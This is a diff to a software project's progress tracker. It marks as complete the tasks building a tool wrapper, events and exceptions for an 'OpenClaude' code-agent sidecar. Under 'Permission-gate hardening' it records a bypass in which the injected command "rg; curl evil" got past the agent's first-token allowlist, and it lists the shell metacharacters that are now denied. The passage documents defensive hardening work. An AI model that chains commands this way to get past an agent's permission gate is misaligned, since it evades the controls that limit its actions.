@@ -10,8 +10,8 @@ Updated as each task lands.
 | 01.0 | OpenClaude Settings & Config | ✅ Complete | `tests/unit/openclaude/test_config.py` (26), `tests/unit/router/` (24) |
 | 02.0 | gRPC Proto & Client          | ✅ Complete     | `tests/unit/openclaude/grpc/test_client.py` (35) |
 | 03.0 | Process Lifecycle Manager    | ✅ Complete     | `tests/unit/openclaude/test_process.py` (51) |
-| 04.0 | OpenClaudeTool Implementor   | ⬜ Not started  | -     |
-| 05.0 | Event Types & Exceptions     | ⬜ Not started  | -     |
+| 04.0 | OpenClaudeTool Implementor   | ✅ Complete     | `tests/unit/openclaude/test_tool.py` (63, 100% branch), `tests/unit/code_intel/` (20) |
+| 05.0 | Event Types & Exceptions     | ✅ Complete     | `tests/unit/openclaude/test_events.py` (67), `test_exceptions.py` (13), `test_package_api.py` (14) |
 | 06.0 | App Wiring & agents.yaml     | ⬜ Not started  | -     |
 | 07.0 | Test Suite — Unit            | ⬜ Not started  | -     |
 | 08.0 | Test Suite — Integration     | ⬜ Not started  | -     |
@@ -382,32 +382,133 @@ drain at DEBUG + per-line-error resilience, external-mode no-forwarder no-op.
 
 ### Task 04.0 — OpenClaudeTool Implementor
 
-**Status:** ⬜ Not started
+**Status:** ✅ Complete
 
 | Subtask | Description                              | Done |
 |---------|------------------------------------------|------|
-| 01      | [Tool skeleton + input schema](04.0-openclaude-tool/01-tool-skeleton.md) | ⬜   |
-| 02      | [Stream processing + content accumulation](04.0-openclaude-tool/02-stream-processing.md) | ⬜   |
-| 03      | [Permission request handling + allowlist](04.0-openclaude-tool/03-permission-allowlist.md) | ⬜   |
-| 04      | [Budget pre-check + truncation](04.0-openclaude-tool/04-budget-truncation.md) | ⬜   |
+| 01      | [Tool skeleton + input schema](04.0-openclaude-tool/01-tool-skeleton.md) | ✅   |
+| 02      | [Stream processing + content accumulation](04.0-openclaude-tool/02-stream-processing.md) | ✅   |
+| 03      | [Permission request handling + allowlist](04.0-openclaude-tool/03-permission-allowlist.md) | ✅   |
+| 04      | [Budget pre-check + truncation](04.0-openclaude-tool/04-budget-truncation.md) | ✅   |
 
-**Delivered:** —
-**Test coverage:** —
+**Delivered:**
+- `src/aegis_swr/openclaude/tool.py` — `OpenClaudeTool`, the sole `CodeBackend`
+  (C4). `delegate(task, ctx)` runs ordered gates (C5): budget pre-check (zero gRPC
+  calls if insufficient) → `dry_run` short-circuit (`[dry-run]`/0 tokens, zero
+  calls) → stream. `_consume_stream` dispatches `AgentFrame`s by `FrameKind` via a
+  handler map, accumulating `TEXT_CHUNK` and counting tool/frame events. On `DONE`
+  it truncates to `max_response_tokens`, charges `max(1, len(text)//4)` (post-stream,
+  success only), and emits the sole token-bearing `OpenClaudeStreamCompleted`.
+  Permission gate, `ERROR`-frame and gRPC-error handling, and a defensive
+  `except Exception` guarantee no exception escapes (C9). **100% branch coverage.**
+- **`src/aegis_swr/code_intel/` scaffolding slice** (`backend.py`, `budget.py`,
+  `agent.py`, `__init__.py`) — the minimal, backend-agnostic contract (`CodeBackend`
+  ABC, `CodeResult`, `CodeTaskContext`, `CallBudget`, `CodeAgent`) that Task 06.0
+  owns; built forward to unblock 04.0. C3-clean (imports neither `openclaude` nor
+  `grpc`). **`app.py` composition wiring is deferred to Task 06.0** (it needs this
+  `OpenClaudeTool`, so it cannot precede it).
+
+**Key decisions & gate outcomes:**
+- **Built to the canonical 06.0 contract, not the stale 04.0 spec wording:** public
+  method is `delegate(task, ctx: CodeTaskContext) -> CodeResult` (not `run`);
+  `CodeResult` is `(content, token_estimate, available, truncated, metadata)` with
+  **per-call failures encoded in `metadata`** (`{ok, error, retriable}`), not
+  `text`/`ok`/`retriable` fields; `ctx.run_id` is a `UUID` (→ `str()` for
+  `query()`/events); frame types come from the client (`AgentFrame`/`FrameKind`);
+  events use the real 05.0 signatures. Budget is a ctor-injected collaborator
+  (`self._budget`).
+- **X002 exemption (sanctioned):** `delegate`'s defensive `except Exception` (C9
+  no-exception-escapes) is a must-never-raise resilience boundary, so
+  `openclaude/tool.py` joins `core/events.py`/`grpc/client.py` in
+  `[tool.flake8_lint_tests].exclude`. Returns a typed failure; re-raises nothing.
+- **/pr-review: APPROVE (after fixes).** Feature REQUEST_CHANGES → resolved: a
+  typed `_DONE` sentinel replaced a `-> Optional[CodeResult]`/`"DONE"` annotation
+  lie; the dead `budget` param was removed from `CodeAgent.investigate` (budget is a
+  backend construction-time collaborator — per-investigation scoping finalized in
+  06.0). Security ADVISORY (2 MEDIUM, no CRITICAL): threat model at
+  `docs/security/2026-07-09-openclaude-tool-permission-gate.md`.
+- **Permission-gate hardening (C7):** the tool-side allowlist check inspected only
+  the first token, so `"rg; curl evil"` auto-approved. Hardened `_is_allowlisted`
+  to deny any command with shell metacharacters (`; & | $ \` newline ( ) { } < >`)
+  or a path-qualified first token; the full bypass matrix is now DENIED (regression
+  tested). Documented as **defense-in-depth + observability** — the authoritative
+  read-only control is the sidecar's `--bash-allowlist` launch flag (Task 03.0
+  managed mode); this gate has no approval back-channel.
+- **Deferred to Task 06.0:** `app.py` composition wiring; per-investigation
+  `CallBudget` lifecycle; an **external-mode runbook** requiring the operator's
+  sidecar to be independently allowlisted (the tool gate is not authoritative
+  there). Deferred to Task 09.0: the `openclaude.*` event-taxonomy doc table.
+- **Coverage:** full unit suite **814 passed**, total **89.14 %**; `tool.py`
+  **100 % branch**, `code_intel/` **100 %**.
+
+**Test coverage:** `tests/unit/openclaude/test_tool.py` (63 tests, 100% branch on
+tool.py), `tests/unit/code_intel/` (20).
 
 ---
 
 ### Task 05.0 — Event Types & Exceptions
 
-**Status:** ⬜ Not started
+**Status:** ✅ Complete
 
 | Subtask | Description                              | Done |
 |---------|------------------------------------------|------|
-| 01      | [Seven event dataclasses](05.0-events-exceptions/01-event-dataclasses.md) | ⬜   |
-| 02      | [Three exception types](05.0-events-exceptions/02-exception-types.md) | ⬜   |
-| 03      | [EventBus registry update](05.0-events-exceptions/03-eventbus-registration.md) | ⬜   |
+| 01      | [Seven event dataclasses](05.0-events-exceptions/01-event-dataclasses.md) | ✅   |
+| 02      | [Three exception types](05.0-events-exceptions/02-exception-types.md) | ✅   |
+| 03      | [EventBus registry update](05.0-events-exceptions/03-eventbus-registration.md) | ✅   |
 
-**Delivered:** —
-**Test coverage:** —
+**Delivered:**
+- `src/aegis_swr/openclaude/events.py` — the full C8 taxonomy: seven
+  `@dataclass(frozen=True, kw_only=True)` events (`OpenClaudeConnected`,
+  `OpenClaudeDisconnected`, `OpenClaudeToolCall`, `OpenClaudeToolResult`,
+  `OpenClaudePermissionDenied`, `OpenClaudeStreamCompleted`,
+  `OpenClaudeStreamError`), each with `run_id`, a UTC `timestamp`, and an
+  `event_type` `ClassVar` sentinel. `OpenClaudeStreamCompleted` is the sole
+  carrier of `token_estimate` (C8). This discharges the Task 03.0
+  forward-declaration obligation (the two lifecycle events were forward-declared
+  there; this task adds the five stream events and unifies the shape).
+- `src/aegis_swr/openclaude/exceptions.py` — canonical three-type hierarchy:
+  `OpenClaudeUnavailableError`, `PermissionDeniedError`, `OpenClaudeConfigError`.
+  Discharges the Task 02.0 forward-declaration obligation.
+- `src/aegis_swr/openclaude/__init__.py` — public re-exports of the seven events
+  + three exceptions (grpc-free; C3).
+
+**Key decisions & gate outcomes:**
+- **EventBus obligation discharged (deviates from 05.0 spec text, deliberately):**
+  all seven events **subclass the live `core.events.DomainEvent`**, NOT the
+  plain-dataclass/`event_type`-string shape the spec describes — that shape
+  targeted Milestone 0003's router bus, which was never built. `EventBus.publish()`
+  dispatches only `DomainEvent` subclasses via `__mro__`, so a plain dataclass
+  would reach zero subscribers. A live-bus publish/subscribe round-trip test proves
+  the decision works. The `event_type` `ClassVar` is retained for `event_type`-based
+  filtering.
+- **Exception superset preserved (Task 02.0 obligation):**
+  `OpenClaudeUnavailableError` keeps the superset ctor
+  `(message, grpc_url=None, *, retriable=True, status_code=None)` because
+  `grpc/client.py:279-283` sets `retriable`/`status_code`. The now-unused
+  `OpenClaudeError` base was dropped (no catch sites) so the three hierarchies are
+  independent, per spec.
+- **`OpenClaudeConfigError` migrated** from `config.py` to `exceptions.py`
+  (canonical home) with a `config.py` re-export; identity preserved
+  (`config.OpenClaudeConfigError is exceptions.OpenClaudeConfigError`), so the
+  Pydantic `isinstance` unwrap path and all `except` sites are unaffected. Distinct
+  from the router's `ConfigValidationError` (neither subclasses the other).
+- **C3 grpc isolation:** `import aegis_swr.openclaude` pulls in no `grpc` (only
+  events + exceptions re-exported; Tool/Process/Client stay behind submodules) —
+  asserted by a `sys.modules` test that snapshots/restores the registry so it can't
+  pollute other tests.
+- **/pr-review: APPROVE** — feature **LGTM**, security **CLEAN** (C9 payload-free
+  and C3 isolation both confirmed; dropping `OpenClaudeError` and the config
+  re-export introduce no error-handling posture change). Two test-quality nits
+  (a tautological tz assertion, a misleading comment) fixed.
+- **Deferred:** the consolidated `openclaude.*` event-taxonomy **doc table**
+  (subtask 03) is owned by Task 09.0 / `docs-updater` per its spec — deferred there
+  so the milestone's docs stay single-sourced; the code deliverable (re-exports) is
+  complete.
+- **Coverage:** full unit suite **730 passed**, total **88.77 %**; `events.py`
+  **100 %**, `exceptions.py` **100 %**.
+
+**Test coverage:** `tests/unit/openclaude/test_events.py` (67), `test_exceptions.py`
+(13), `test_package_api.py` (14).
 
 ---
 
